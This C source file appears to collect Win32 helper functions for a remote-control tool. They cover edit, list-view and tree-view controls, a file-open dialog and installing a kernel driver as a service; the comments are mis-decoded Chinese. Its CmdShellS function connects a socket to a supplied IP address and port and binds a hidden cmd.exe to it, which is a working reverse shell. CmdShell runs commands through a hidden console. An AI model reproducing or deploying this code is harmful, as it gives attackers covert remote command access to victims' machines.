//���ܣ���༭��ؼ�ĩβ����ı�
//����1���༭����
//����2���ַ���ָ��
//����3����Ӻ��Ƿ���
BOOL AddTextToEdit(HWND hEdit,char *szTxt,BOOL bNextLine)
{
	static char NextLine[]={13,10,0};

	SendMessage(hEdit,EM_SETSEL,-2,-1);
	SendMessage(hEdit,EM_REPLACESEL,0,(long)szTxt);
	if(bNextLine)
		SendMessage(hEdit,EM_REPLACESEL,0,(long)NextLine);
	return 1;
}
//���ܣ�ִ��CMD������ܵ����ţ�ִ��һ���Ե����������������̣�
//����1�������ַ���ָ��
//����2��ָ��һ����������Ż��Ե�����
//����ֵ�����Ե��ֽ���
int CmdShell(char *command,char *pOutBuf)
{
	char szBuf[5*1024];
	char str[256];
	STARTUPINFO si;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	HANDLE hRead,hWrite;
	DWORD dwRead,Count=0;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	//���������ܵ�����cmd�����
	if(!CreatePipe(&hRead,&hWrite,&sa,0))
		MessageBox(NULL,"�ܵ�����ʧ��","Message",MB_OK);

	//���ϵͳĿ¼
	GetSystemDirectory(szBuf,256);
	lstrcat(szBuf,"\\cmd.exe /c ");
	lstrcat(szBuf,command);

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	CreateProcess(NULL,szBuf,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);

	//��һ��һ��Ҫ���ڶ��ܵ�֮ǰ�������ڶ���֮ǰreadfile���᷵��
	//TMD���bug�˷�����һ�����ʱ��|||
	CloseHandle(hWrite);
	//ѭ�����ӹܵ���ķ�����Ϣ
	szBuf[0]=0;
	szBuf[1]=0;
	if (!pOutBuf)//pOutBufΪNULLָ��������д����
		return 0;
	while(1)
	{
		//ReadFile(hRead,rBuffer,1024,&dwRead,NULL)
		ReadFile(hRead,str,255,&dwRead,NULL);
		if(dwRead)
		{
			Count+=dwRead;
			str[dwRead]=0;
			str[dwRead+1]=0;				//�ܵ�����ַ��������0���Լ�����
			lstrcat(szBuf,str);
			continue;
		}
		else
			break;
	}
	lstrcpy(pOutBuf,szBuf);
	pOutBuf[Count+1]=0;
	pOutBuf[Count+2]=0;
	CloseHandle(hRead);

	return lstrlen(szBuf);
}

//��ܵ����������ֱ�Ӻ�Socket����
//����1��IP��ַ�ַ���
//����2���˿ں�
//����3�����̾����ָ�룬���������ﷵ��cmd���̵ľ��
//����ֵ���������׽���
SOCKET CmdShellS(char *szIPAdrees,int Port,HANDLE *hProcess)
{
	char szBuf[5*1024];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2,2),&wsaData))
		MessageBox(NULL,"��ʼ��ʧ��","Message",MB_OK);
	SOCKET sClient = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0);
	if(sClient == INVALID_SOCKET)
	{
		MessageBox(NULL,"�׽��ֽ���ʧ��","Message",MB_OK);
	}
	// ��sockaddr_in�ṹ��װ��������˵�ַ��Ϣ
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(Port);
	servAddr.sin_addr.S_un.S_addr =inet_addr(szIPAdrees);//��������ip
	//���ӷ�������
	connect(sClient,(sockaddr*)&servAddr,sizeof(servAddr));

	//���ϵͳĿ¼
	GetSystemDirectory(szBuf,256);
	lstrcat(szBuf,"\\cmd.exe");

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.hStdError=(void *)sClient;
	si.hStdInput=(void *)sClient;
	si.hStdOutput =(void *)sClient;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	CreateProcess(NULL,szBuf,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
	(*hProcess)=pi.hProcess;

	return sClient;
} 
//���ܣ������ļ��������չ�ļ��� �ַ�������
//����1��Դ�ļ���
//����2���ļ���չ���Ļ�����ָ��
void GetFileTypeSz(char *pszFile,char *pszExp)
{
	char *p;
	p=pszFile;
	while((*p)!='.')
	{
		p++;
		if(*p==0)
			return;
	}
	p++;
	lstrcpy(pszExp,p);
	GetFileTypeSz(p,pszExp);//�ݹ���ã��ҳ����һ����չ��
}
//Ϊ�б���ͼ�ؼ����һ����Ŀ/����Ŀ
//����1���б���ͼ�ؼ����
//����2����ӵ���Ŀ�������ţ��У�
//����3����ӵ�����Ŀ�������ţ��У�
//����4����Ŀ�ı�
BOOL AddListVeiwItem(HWND hList,int ItemIndex,int SubItemIndex,char *pszText)
{
	char str[MAX_PATH]={0};
	LVITEM lvi;
	ZeroMemory(&lvi,sizeof(lvi));
	lvi.mask=LVIF_TEXT;
	lvi.iItem=ItemIndex;
	lvi.cchTextMax=MAX_PATH;

	lvi.pszText=pszText;
	lvi.iSubItem=SubItemIndex;
	return SendMessage(hList,LVM_INSERTITEM,0,(long)&lvi);
}
//�༭�б���ͼ�ؼ���һ����Ŀ/����Ŀ
//����ͬAddListVeiwItem
BOOL SetListVeiwItem(HWND hList,int ItemIndex,int SubItemIndex,char *pszText)
{
	char str[MAX_PATH]={0};
	LVITEM lvi;
	ZeroMemory(&lvi,sizeof(lvi));
	lvi.mask=LVIF_TEXT;
	lvi.iItem=ItemIndex;
	lvi.cchTextMax=MAX_PATH;

	lvi.pszText=pszText;
	lvi.iSubItem=SubItemIndex;
	return SendMessage(hList,LVM_SETITEM,0,(long)&lvi);
}
//��������ͼ�ؼ���һ����Ŀ�������Ŀ
void AddChildItem(HWND hTree,HTREEITEM hParent,char *pszText)
{
	TVINSERTSTRUCT ti;
	ZeroMemory(&ti,sizeof(ti));
	ti.item.mask=TVIF_TEXT|TVIF_HANDLE;
	ti.hParent=hParent;
	ti.hInsertAfter =TVI_LAST;
	ti.item.pszText=pszText;

	SendMessage(hTree,TVM_INSERTITEM,0,(long)&ti);
}
//�õ�������ͼ�ؼ�һ����Ŀ���ı�
int GetTreeItemText(HWND hTree,HTREEITEM hItem,char *pszText)
{
	TVITEMEX tvi;
	tvi.mask=TVIF_TEXT|TVIF_HANDLE;
	tvi.hItem=hItem;
	tvi.pszText=pszText;
	tvi.cchTextMax=MAX_PATH;
	int b;

	b=TreeView_GetItem(hTree,&tvi);
	//SendMessage(hTree,TVM_GETITEM,0,(long)&tvi);
	return lstrlen(pszText);
}
//���������ͼ�ؼ�ĳһ��Ŀ������Ŀ
void CleanTreeItem(HWND hTree,HTREEITEM hPItem)
{
	HTREEITEM hItem;
	
a:	hItem=(HTREEITEM)SendMessage(hTree,TVM_GETNEXTITEM,TVGN_CHILD,(long)hPItem);
	if(hItem)
	{
		SendMessage(hTree,TVM_DELETEITEM,0,(long)hItem);
		goto a;
	}
}
//����б���ͼ�ؼ�����Ŀ
void CleanListItem(HWND hList)
{
	SendMessage(hList,LVM_DELETEALLITEMS,0,0);
}
//���б���ͼ�ؼ��ĸ�����Ŀ�ı��á�/�����ӳ�·������ʽ
int GetWholePath(HWND hTree,HTREEITEM hCurSel,char *pszPath)
{ 
	int nPathLen=0;
	char szBuf[MAX_PATH]={0};
	HTREEITEM hParent;

	//����Ŀ�ļ�������Ŀ���ı�
	nPathLen+=GetTreeItemText(hTree,hCurSel,szBuf);
	lstrcat(szBuf,"\\");
	lstrcat(szBuf,pszPath);
	lstrcpy(pszPath,szBuf);
	hParent=(HTREEITEM)SendMessage(hTree,TVM_GETNEXTITEM,TVGN_PARENT,(long)hCurSel);
	if(hParent)
	{		
		//�ݹ����
		nPathLen+=GetWholePath(hTree,hParent,pszPath);
	}		
	return nPathLen+1;
}
//"���ļ�"�Ի���
//����1��������
//����2�������ļ������ִ�
//����3�������ļ�ȫ·����
BOOL OpenFileDlg(HWND hWnd,char *szFilter,char *pszFile)
{
	OPENFILENAME of;

	ZeroMemory(&of,sizeof(of));
	ZeroMemory(pszFile,MAX_PATH);
	of.lStructSize=sizeof(of);
	of.hwndOwner=hWnd;
	of.lpstrFilter=szFilter;
	of.lpstrFile=pszFile;
	of.nMaxFile=MAX_PATH;
	of.Flags=OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;
	return GetOpenFileName(&of);
}

//���ط���������
//����1����������������
//����2����ִ���ļ�λ��
//����3������ͬʱ�Ƿ�����
bool InstallService(char *szDriver,char *szFile,bool bStart)
{
   SC_HANDLE sh=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
   if(!sh)return false;
   SC_HANDLE rh=CreateService(sh,szDriver,szDriver,SERVICE_ALL_ACCESS,
                                                   SERVICE_KERNEL_DRIVER,
                                                   SERVICE_DEMAND_START,
                                                   SERVICE_ERROR_NORMAL,
                                                   szFile,NULL,NULL,NULL,
                                                   NULL,NULL);
   if(!rh)
   {
     if(GetLastError()==ERROR_SERVICE_EXISTS)
     {
        //�����Ѱ�װ�����
        rh=OpenService(sh,szDriver,SERVICE_ALL_ACCESS);
        if(!rh)
        {
          CloseServiceHandle(sh);
          return false;
        }
     }
     else
     {
        CloseServiceHandle(sh);
        return false;
     }
   }
   if(bStart)                //�Ƿ�Ҫ��������
     StartService(rh,0,NULL);
   CloseServiceHandle(sh);
   CloseServiceHandle(rh);
   return true;
}
//ж�ط���������
//��������������������
bool UnInstall(char *szService)
{
   SC_HANDLE sh=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
   if(!sh)return false;
   SC_HANDLE rh=OpenService(sh,szService,SERVICE_ALL_ACCESS);
   if(DeleteService(rh))return true;
   return false;
}
















